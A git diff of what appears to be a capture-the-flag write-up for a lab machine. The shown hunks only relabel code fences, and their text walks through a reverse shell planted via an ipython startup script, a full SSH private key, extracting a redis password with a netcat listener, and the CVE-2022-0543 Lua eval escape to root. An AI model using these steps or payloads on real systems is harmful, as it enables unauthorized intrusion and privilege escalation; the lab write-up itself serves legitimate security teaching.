@@ -188,7 +188,7 @@ Also don't forget to set up your listener.
 
 Note: Root is periodically deleting the files in /opt/scripts_review/ so you gotta be a little quick.
 
-```
+```console
 james_mason@shared:/tmp$ mkdir -m 777 /opt/scripts_review/profile_default
 james_mason@shared:/tmp$ mkdir -m 777 /opt/scripts_review/profile_default/startup
 james_mason@shared:/tmp$ cp reverse.py /opt/scripts_review/profile_default/startup/
@@ -197,7 +197,7 @@ james_mason@shared:/tmp$ cp reverse.py /opt/scripts_review/profile_default/start
 After a small wait the user dan_smith with launch ipython and you can grab your shell and get the user flag!
 
 
-```
+```console
 └──╼ [★]$ nc -lvnp 1234
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::1234
@@ -209,7 +209,7 @@ $ id
 uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
 $ 
 ```
-```
+```console
 $ cat user.txt
 16b10***************************
 ```
@@ -219,7 +219,7 @@ Next we are gonna grab the ssh keys for dan_smith so we can use the very nice ss
 Note: Be sure to have an enter after the last line in a key file otherwise it will not be read properly when launching ssh.
 Note2: Also make sure to ```chmod 600``` the ssh key file as it will not work with too many permissions.
 
-```
+```console
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO
@@ -267,10 +267,10 @@ It catches mostly the same thing and our next PE vector.
 
 We are going to explit a vulnerability in the redis-server running on port 6379.
 
-```
+```console
 2022/09/20 11:22:34 CMD: UID=0    PID=12249  | /usr/bin/redis-server 127.0.0.1:6379  
 ```
-```
+```console
 root        3482  1.3  0.7  65104 14908 ?        Ssl  11:02   0:00 /usr/bin/redis-server 127.0.0.1:6379
 ```
 Hacktricks gives almost all of the info we will need to exploit this.
@@ -281,7 +281,7 @@ Before we can actually access and get any info from the server we will need a pa
 
 So I am going to send it over to my host computer for further analysis.
 
-```
+```console
 dan_smith@shared:/usr/local/bin$ ipython -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.14.83 - - [20/Sep/2022 12:07:29] "GET /redis_connector_dev HTTP/1.1" 200 -
@@ -291,7 +291,7 @@ For fun I tried out Ghidra and GDB to see if I could find the password in there,
 
 So the quick and easy way is to set up a listener and run the program on our machine.
 
-```
+```console
 └──╼ [★]$ ./redis_connector_dev 
 [+] Logging to redis instance using password...
 
@@ -301,7 +301,7 @@ INFO command result:
  
  Doing so spits out a password ```F2WHqJUz2WEz=Gqq```
  
- ```
+ ```console
  └──╼ [★]$ nc -lvnp 6379
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::6379
@@ -319,7 +319,7 @@ Now we can login to the redis-cli with the password
 
 Note: using the password in the command will make it so you do not have to constantly authorize in redis-cli.
 
-```
+```console
 dan_smith@shared:/tmp$ redis-cli -a F2WHqJUz2WEz=Gqq
 Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
 127.0.0.1:6379> 
@@ -335,7 +335,7 @@ https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md
 
 We get confirmation that it works!
 
-```
+```console
 127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
 "uid=0(root) gid=0(root) groups=0(root)\n"
 ```
